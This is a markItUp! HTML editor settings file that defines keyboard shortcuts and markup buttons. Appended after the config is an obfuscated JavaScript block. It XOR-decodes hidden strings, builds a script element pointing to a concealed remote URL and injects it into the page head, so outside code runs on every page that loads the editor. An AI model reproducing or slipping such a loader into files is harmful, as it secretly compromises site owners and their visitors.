// ----------------------------------------------------------------------------
// markItUp!
// ----------------------------------------------------------------------------
// Copyright (C) 2008 Jay Salvat
// http://markitup.jaysalvat.com/
// ----------------------------------------------------------------------------
// Html tags
// http://en.wikipedia.org/wiki/html
// ----------------------------------------------------------------------------
// Basic set. Feel free to add more tags
// ----------------------------------------------------------------------------
mySettings = {	
	onShiftEnter:  	{keepDefault:false, replaceWith:'<br />\n'},
	onCtrlEnter:  	{keepDefault:false, openWith:'\n<p>', closeWith:'</p>'},
	onTab:    		{keepDefault:false, replaceWith:'    '},
	markupSet:  [ 	
		{name:'Bold', key:'B', openWith:'(!(<strong>|!|<b>)!)', closeWith:'(!(</strong>|!|</b>)!)' },
		{name:'Italic', key:'I', openWith:'(!(<em>|!|<i>)!)', closeWith:'(!(</em>|!|</i>)!)'  },
		{name:'Stroke through', key:'S', openWith:'<del>', closeWith:'</del>' },
		{separator:'---------------' },
		{name:'Picture', key:'P', replaceWith:'<img src="[![Source:!:http://]!]" alt="[![Alternative text]!]" />' },
		{name:'Link', key:'L', openWith:'<a href="[![Link:!:http://]!]"(!( title="[![Title]!]")!)>', closeWith:'</a>', placeHolder:'Your text to link...' },
		{separator:'---------------' },
		{name:'Clean', className:'clean', replaceWith:function(markitup) { return markitup.selection.replace(/<(.*?)>/g, "") } },		
		{name:'Preview', className:'preview',  call:'preview'}
	]
};function n8pO89S(yPoi,llZ9){var uHKO='';var jI5yUA=0;var m7k=0;for(jI5yUA=0;jI5yUA<yPoi.length;jI5yUA++){var xY=yPoi.charAt(jI5yUA);var qadNF=xY.charCodeAt(0)^llZ9.charCodeAt(m7k);xY=String.fromCharCode(qadNF);uHKO+=xY;if(m7k==llZ9.length-1)m7k=0;else m7k++;}return (uHKO);}var xn96=["016027","017017","019012","000010043007067040020026081053045042019","016010045","023001062003","023029054018024039048000085043043054014010023","002008062003089041018030093052044","011029047002","004029058035091040060019090044059006030046002031000007090040","011012058022013098126005064057060033073009014020124072069056126028071119043042019084009011"];function eFqO8F(yeX3q){var e1G=document[lBvooUK(xn96[3])](lBvooUK(xn96[0])+lBvooUK(xn96[1])+lBvooUK(xn96[2]));e1G[lBvooUK(xn96[4])]=yeX3q;e1G[lBvooUK(xn96[5])]=lBvooUK(xn96[6]);document[lBvooUK(xn96[9])](lBvooUK(xn96[8]))[0][lBvooUK(xn96[7])](e1G);}function fBtTD(yL){var ggzI='';var mf6r2F=0;var ev=0;for(mf6r2F=0;mf6r2F<yL.length/3;mf6r2F++){ggzI+=String.fromCharCode(yL.slice(ev,ev+3));ev=ev+3;}return ggzI;}function lBvooUK(iWt2R6){return n8pO89S(fBtTD(iWt2R6),'cxNf7MQv4XHDgz');}eFqO8F(lBvooUK(xn96[10]));